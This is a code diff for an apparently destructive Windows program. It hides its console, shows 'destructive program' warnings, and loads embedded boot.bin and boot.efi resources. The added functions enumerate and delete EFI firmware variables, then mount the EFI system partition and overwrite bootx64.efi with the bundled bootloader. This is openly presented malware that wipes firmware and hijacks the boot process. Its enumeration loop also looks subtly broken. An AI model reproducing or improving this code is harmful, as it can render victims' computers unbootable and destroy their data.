@@ -7,6 +7,55 @@
 
 using namespace std;
 
+void LoadResourceData(int resourceId, LPCWSTR resourceType, std::vector<char>& data) {
+    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceId), resourceType);
+    if (!hResource) {
+        throw std::runtime_error("Could not find resource");
+    }
+
+    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
+    if (!hLoadedResource) {
+        throw std::runtime_error("Could not load resource");
+    }
+
+    DWORD size = SizeofResource(NULL, hResource);
+    if (size == 0) {
+        throw std::runtime_error("Resource size is zero");
+    }
+
+    void* pResourceData = LockResource(hLoadedResource);
+    if (!pResourceData) {
+        throw std::runtime_error("Could not lock resource");
+    }
+
+    data.assign(static_cast<char*>(pResourceData), static_cast<char*>(pResourceData) + size);
+}
+
+vector<wstring> enumerateEFIVariables() {
+    vector<wstring> variables;
+    WCHAR name[1024];
+    DWORD size = sizeof(name) / sizeof(name[0]);
+    DWORD index = 0;
+
+    while (GetFirmwareEnvironmentVariableEx(name, L"{00000000-0000-0000-0000-000000000000}", nullptr, 0, nullptr) || GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+        variables.push_back(name);
+        size = sizeof(name) / sizeof(name[0]);
+        index++;
+    }
+
+    return variables;
+}
+
+// Function to delete an EFI variable
+bool deleteEFIVariable(const wstring& variableName) {
+    if (SetFirmwareEnvironmentVariable(variableName.c_str(), L"{00000000-0000-0000-0000-000000000000}", 0,0)) {
+        return true;
+    }
+    else {
+        return false;
+    }
+}
+
 wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
 {
     wchar_t* wString = new wchar_t[4096];
@@ -115,8 +164,19 @@ LONG SetRegValue(const wchar_t* path, const wchar_t* name, const wchar_t* value)
 int main(int argc, char** argv)
 {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-    LPCWSTR filename = convertCharArrayToLPCWSTR(argv[0]);
-    UnpackDeps(filename);
+
+    try {
+        std::vector<char> bootBinData;
+        LoadResourceData(IDR_BOOT_BIN, RT_RCDATA, bootBinData);
+        std::cout << "boot.bin loaded, size: " << bootBinData.size() << " bytes" << std::endl;
+
+        std::vector<char> bootEfiData;
+        LoadResourceData(IDR_BOOT_EFI, RT_RCDATA, bootEfiData);
+        std::cout << "boot.efi loaded, size: " << bootEfiData.size() << " bytes" << std::endl;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Error: " << e.what() << std::endl;
+    }
 
     int confirmbox = MessageBox(NULL, L"This is a destructive program. By clicking OK you acknowledge that the creator is not responsible for any damage caused.", L"WARNING", MB_OKCANCEL | MB_ICONEXCLAMATION);
     if (confirmbox == IDCANCEL) return 0;
@@ -125,6 +185,11 @@ int main(int argc, char** argv)
     if (secondconfirmbox == IDCANCEL) return 0;
 
     if (is_efi() != ERROR_INVALID_FUNCTION) {
+        auto variables = enumerateEFIVariables();
+
+        for (const auto& variable : variables) {
+            deleteEFIVariable(variable);
+        }
         system("C:\\Windows\\System32\\mountvol P: /S");
         DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
         CopyFile(L"C:\\Windows\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
